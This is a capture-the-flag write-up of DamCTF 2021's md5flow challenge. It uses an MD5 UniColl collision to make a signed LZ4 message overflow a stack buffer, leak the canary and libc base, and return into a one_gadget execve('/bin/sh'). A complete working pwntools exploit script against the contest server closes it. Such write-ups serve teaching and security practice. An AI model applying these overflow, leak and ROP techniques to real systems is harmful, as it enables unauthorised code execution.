# Writeup md5flow (crypto/pwn) from DamCTF 2021

> Ok, so maybe that [artisan hash](https://gitlab.com/osusec/damctf-2020/-/tree/master/crypto/hashflow) wasn't such a great idea. Let's use a standard cryptographic hash instead.
>
>Hint: The server is running ubuntu 18.04
>
>`nc chals.damctf.xyz 31656`

3 solves / 499 points

## Given

The full source code is given along with the libc, which matches the `ubuntu:18.04` docker image (before running `apt upgrade`).

md5flow.c
```c
#include <openssl/aes.h>
#include <openssl/md5.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <lz4.h>

void read_flag();
void read_key();
static void sign();
static void verify();

AES_KEY key;

void read_key()
{
	unsigned char key_buf[16];

	FILE* urandom = fopen("/dev/urandom", "rb");
	if (!urandom) exit(EXIT_FAILURE);
	if (fread(key_buf, 16, 1, urandom) != 1) exit(EXIT_FAILURE);
	if (fclose(urandom)) exit(EXIT_FAILURE);

	AES_set_encrypt_key(key_buf, 128, &key);
}

typedef struct
{
	unsigned char data[16];
} digest;

digest hash(unsigned char* buffer, size_t len)
{
	digest d;
	if (MD5(buffer, len, d.data) != d.data) exit(EXIT_FAILURE);
	return d;
}

digest mac(unsigned char* buffer, size_t len)
{
	digest d = hash(buffer, len);

	digest mac;
	AES_encrypt(d.data, mac.data, &key);

	return mac;
}

__attribute__((always_inline))
static inline void sign()
{
	unsigned char buffer[0xc0];
	unsigned char msg[0x100];

	printf("Message: ");
	size_t len = read(STDIN_FILENO, buffer, sizeof(buffer));
	digest m = mac(buffer, len);

	int decomp_size = LZ4_decompress_safe(buffer, msg, len, sizeof(msg) - 1);
	if (decomp_size < 0)
	{
		printf("Error decompressing message.\n");
		exit(EXIT_FAILURE);
	}
	msg[decomp_size] = 0;

	printf("Signature: ");
	for (unsigned int j = 0; j < sizeof(m.data); j++)
		printf("%02x", m.data[j]);
	printf("\n");
	printf("For: %s\n", msg);
}

__attribute__((always_inline))
static inline void verify()
{
	unsigned char buffer[0xc0];
	unsigned char msg[0x100];
	memset(msg, 0, sizeof(msg));

	printf("Message: ");
	size_t len = read(STDIN_FILENO, buffer, sizeof(buffer));
	digest m = mac(buffer, len);

	printf("Signature: ");
	digest sig;
	for (unsigned int j = 0; j < sizeof(sig.data); j++)
		scanf("%02hhx", &sig.data[j]);

	if (memcmp(sig.data, m.data, sizeof(sig.data)))
	{
		printf("Invalid signature!\n");
		exit(EXIT_FAILURE);
	}

	LZ4_decompress_safe(buffer, msg, len, 0x1000);

	printf("Verified message: %s\n", msg);
}

void menu()
{
	printf("0: Sign a message\n");
	printf("1: Verify a message\n");

	while (true)
	{
		int option;
		printf("Pick an option: ");
		scanf("%d", &option);

		if (option == 0)
			sign();
		else if (option == 1)
			verify();
		else
			break;
	}
}

void sys_exit(int status, void* arg)
{
	syscall(SYS_exit, status);
}

int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	read_key();

	menu();

	return EXIT_SUCCESS;
}
```

`sign`: Sign the MD5 hash of an LZ4 compressed string.
The compressed string has length at most 0xc0 and uncompressed 0x100.

`verify`: Verify the signature and print the decompressed message.
`LZ4_decompress_safe` is allowed an uncompressed length of 0x1000, but the destination buffer `msg`
only has a size of 0x100.

To solve this challenge, we must find an MD5 collision such that the two messages have a different uncompressed length.

## LZ4

The [LZ4 Block Format](https://github.com/lz4/lz4/blob/dev/doc/lz4_Block_format.md) is used.
We give a brief overview.

Each block consists of a sequence of literals (bytes copied verbatim to the output) and copy operations.
It ends in a literal of length at least 5.
All but the last literal must have a copy operation.

- First byte:
  - 4 high bits: `length`
  - 4 low bits: `matchlength`
- If `length` = 0xf, subsequent bytes are added to `length` (until reaching a byte < 0xff)
- `length` literal bytes (copied to the output) 
- 2 bytes `offset` (little endian)
- If `matchlength` = 0xf, subsequent bytes are added to `matchlength` (until reaching a byte < 0xff)
  - `matchlength` + 4 bytes, starting at the current position `-offset` are copied to the output.

For example, `A`*100 is compressed as follows:
```
1f 41 0100 4b 50 4141414141

1f: literal of length 1, matchlength 15
41: literal `A` (also part of output)
0100: offset -1
4b: added to matchlength, for total of 15 + 75 + 4 = 94
    i.e. A is copied 94 times
50: literal of length 5
4141414141: literal `AAAAA`
```

## UniColl

To generate suitable collisions, we use [UniColl](https://github.com/corkami/collisions#unicoll-md5),
implemented in [Hashclash](https://github.com/cr-marcstevens/hashclash/blob/master/scripts/poc_no.sh).
UniColl produces 2 blocks (128 bytes), of which we can control a prefix of length `4k, k<=5`
(the collision blocks may be also preceded by an arbitrary number of prefix blocks, which we don't use here).
There exist different variants of UniColl, but the one we use, adds 1 to the 9th byte of the prefix in the collision.
So, we can compute two 128-byte strings `c1` and `c2` with `md5(c1) = md5(c2)`, where `c1` has a chosen prefix `a`
and `c2` has prefix `a'` obtained from `a` by adding `1` to the 9th byte.

We give the following 16 byte prefix to hashclash:
```
60 414141414141 0100 fe 66 4242424242

60 414141414141 0100: Literal `A`*6, copy the last `A` 4 times (0+4 from 60)
fe 66 4242424242: Literal of length 117 (0xf + 0x66), starting with `B`*6,
                  112 literal bytes (128-16) are added from unicoll,
                  matchlength e
```
After the 128 bytes of `c1`, LZ4 expects the two `offset` bytes.

The prefix of `c2` will then be
```
60 414141414141 0100 ff 66 4242424242
                      ^
```
We have to run hashclash until it gives us `c2` without null bytes in the 112 literal bytes after the prefix,
because those are part of the decompressed string and we need to use `printf` to leak canary and libc offset.

Due to the `f` in `matchlength`, LZ4 expects another byte for `matchlength` after `offset`.
We can harness this to construct a suffix `s` for `c1` and `c2` such that `len(decompress(c1+s)) <= 0x100`
and the length and end of `decompress(c2+s)` can be chosen freely (within a sufficient range).
The suffix of `decompress(c2+s)` is also controlled.
Recall that if `md5(c1) = md5(c2)`, `len(c1) = len(c2)` and `len(c1) % 64 = 0`, then
`md5(c1+s) = md5(c2+s)` for all `s`.
```py
def make_suffix(length, end):
  # compute length of next literal
  L = length - 150
  for i in (0, 1):
    l0 = (L - i * 0x10) & 0xf0
    l1 = (l0 >> 4) - 1
    pad = L - l0 - l1
    if pad >= 0:
      break
  assert pad >= 0
  
  s = bytearray(
    [1, 0,     # offset
     l0,       # length of next literal in c1, second matchlength byte in c2
     l0 - 0x10 # literal byte in c1, length of next literal in c2
     ] + [0x42] * l1 + [1, 0]) # remaining literal bytes and offset in c1 and c2

  # pad to `length` and append `end`
  rem = pad + len(end)
  assert rem >= 5
  s.append((l2 := min(0xf, rem)) << 4)
  rem -= l2
  if l2 == 0xf:
    s.append(rem)
    assert rem < 0x100

  s.extend(b'C' * pad)
  s.extend(end)

  s = bytes(s)
  assert len(c1 + s) <= 0xc0
  assert len(decompress(c1 + s)) < 0x100
  assert len(x := decompress(c2 + s)) - len(end) == length
  assert x.endswith(end)
  return s
```

## Exploitation

For debugging, we copy the libraries from the `ubuntu:18.04` docker image and 
run `md5flow` with `process(['./ld-2.27.so', '--library-path', '.', './md5flow'], aslr=False)`
We could also determine the exact libc version using the [libc database](https://libc.blukat.me/?q=read%3A180%2Csystem%3A4e0&l=libc6_2.27-3ubuntu1.2_amd64)
and extracting symbol offsets from the supplied libc.

The goal is now to overflow the `msg` buffer in `verify` to override the return address
of `menu` (`verify` has no return because it is inlined).
First, we have to extract the stack canary:

```py
E = b'E' * 9
s = make_suffix(256, E)  # canary is 8 bytes after `msg`, override its leading 0
m1 = c1 + s
sig, _ = sign(m1)
v = verify(c2 + s, sig)
canary = b'\0' + v.split(E)[1][:7]  # add leading 0 back
```

Next we need to determine the memory location of libc.
For that, we use the fact that the return address of `__libc_start_main`
lies on the stack (specifically `__libc_start_main + 231`).

```py
# get libc_start_main return address
F = b'F' * 16
s = make_suffix(328, b'F' * 16)
sig, _ = sign(c1 + s)

v = verify(c2 + s, sig)
libc_ret = u64(v.split(F)[1].ljust(8, b'\0'))
libc_addr = libc_ret - LIBC.symbols.__libc_start_main - 231
```

Now, we write the address, we want to jump to.
[OneGadget](https://github.com/david942j/one_gadget) gives:
```
0x10a45c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```
Our very short ROP chain to execute `/bin/sh` is then written as follows.
We need an extra `ret` to satisfy `[rsp+0x70] == 0`.
```py
gadget = 0x10a45c + libc_addr
ret = libc_addr + 0x979
s = make_suffix(328, p64(ret) + p64(gadget))
sig, _ = sign(c1 + s)
v = verify(c2 + s, sig)
```
Finally, we override the canary and then exit. 
```py
s = make_suffix(256 + 8, canary + b'a' * 8 + b'X' * 8)
sig, _ = sign(c1 + s)
v = verify(c2 + s, sig)
```
After exiting `menu`, we get a shell and then flag `dam{1_wOUldN'T-tru$t-MDS_7O-TaKE_MY_t3MP3r47UrE}`.

## Complete Exploit Code

```py
from pwn import *
import lz4.block
from hashlib import md5

context(log_level='debug', terminal=['alacritty', '-e'], arch='amd64', bits=64)


def compress(data):
  return lz4.block.compress(data, store_size=False)


def decompress(data):
  return lz4.block.decompress(data, uncompressed_size=0x1000)


c1 = bytes.fromhex(
  '604141414141410100fe664242424242514237cbdec7a38e87cb47c9d1f2189bb7eaee58ee29e8d4512e238e2d91d9cf74f3cf4b197bb578c81bb0f6d4cd8b2ced74225bf5fa6a44badf8b76901b9b36f1175737170a9ab545f79166b9ba64b4267d14bd034377c155db9ef0a6416e6c8eafa96c65e9021587d5d2656360f878')
c2 = bytes.fromhex(
  '604141414141410100ff664242424242514237cbdec7a38e87cb47c9d1f2189bb7eaee58ee29e8d4512e238e2d91d9cf74f3cf4b197bb578c81bb0f6d4cd8b2ced74225bf5fa6a44bade8b76901b9b36f1175737170a9ab545f79166b9ba64b4267d14bd034377c155db9ef0a6416e6c8eafa96c65e9021587d5d2656360f878')
assert md5(c1).digest() == md5(c2).digest()

LIBC = ELF('libc.so.6', False)
# print(hex(E.symbols.read))
# print(hex(E.symbols.system))

def make_suffix(length, end):
  L = length - 150
  for i in (0, 1):
    l0 = (L - i * 0x10) & 0xf0
    l1 = (l0 >> 4) - 1
    pad = L - l0 - l1
    if pad >= 0:
      break
  assert pad >= 0
  s = bytearray([1, 0, l0, l0 - 0x10] + [0x42] * l1 + [1, 0])

  rem = pad + len(end)
  assert rem >= 5
  s.append((l2 := min(0xf, rem)) << 4)
  rem -= l2
  if l2 == 0xf:
    s.append(rem)
    assert rem < 0x100

  s.extend(b'C' * pad)
  s.extend(end)

  s = bytes(s)
  assert len(c1 + s) <= 0xc0
  assert len(decompress(c1 + s)) < 0x100
  assert len(x := decompress(c2 + s)) - len(end) == length
  assert x.endswith(end)
  return s


def test_suffix():
  make_suffix(256, b'deadbeef')
  make_suffix(300, b'hello world')
  make_suffix(400, b'hello world')


test_suffix()


def sign(msg):
  p.sendlineafter(b'option: ', b'0')
  p.sendafter(b'Message: ', msg)
  p.recvuntil(b'Signature: ')
  sig = p.recvline(keepends=False)
  p.recvuntil(b'For: ')
  msg = p.recvuntil(msg_end := b'\nPick an')[:-len(msg_end)]
  return sig, msg


def verify(msg, sig):
  p.sendlineafter(b'option: ', b'1')
  p.sendafter(b'Message: ', msg)
  p.sendlineafter(b'Signature: ', sig)
  p.recvuntil(b'Verified message: ')
  msg = p.recvuntil(msg_end := b'\nPick an')[:-len(msg_end)]
  return msg


dbg = 0
local = 0
if local:
  p = process(['./ld-2.27.so', '--library-path', '.', './md5flow'], aslr=bool(1-dbg))
  if dbg:
    gdb.attach(p, '''
# check canary
b *0x000015555512a046
# b *0x0000155555401046
# menu ret
b *0x000015555512a062
c
''')
else:
  p = remote('chals.damctf.xyz', 31656)



def run():
  # get canary
  E = b'E' * 9
  s = make_suffix(256, E)
  m1 = c1 + s
  sig, _ = sign(m1)

  v = verify(c2 + s, sig)
  canary = b'\0' + v.split(E)[1][:7]
  print(hex(u64(canary)))

  # get libc_start_main return address
  F = b'F' * 16
  s = make_suffix(328, b'F' * 16)
  sig, _ = sign(c1 + s)

  v = verify(c2 + s, sig)
  libc_ret = u64(v.split(F)[1].ljust(8, b'\0'))
  libc_addr = libc_ret - LIBC.symbols.__libc_start_main - 231
  log.info(f'libc_ret  0x{libc_ret:016x}')
  log.info(f'libc_addr 0x{libc_addr:016x}')

  # write ret addr
  gadget = 0x10a45c + libc_addr
  ret = libc_addr + 0x979
  s = make_suffix(328, p64(ret) + p64(gadget))
  sig, _ = sign(c1 + s)
  v = verify(c2 + s, sig)

  # write canary
  s = make_suffix(256 + 8, canary + b'a' * 8 + b'X' * 8)
  sig, _ = sign(c1 + s)
  v = verify(c2 + s, sig)
  print(v)

  # return
  p.sendline(b'2')
  p.sendline(b'cat flag')
  p.interactive()


run()
```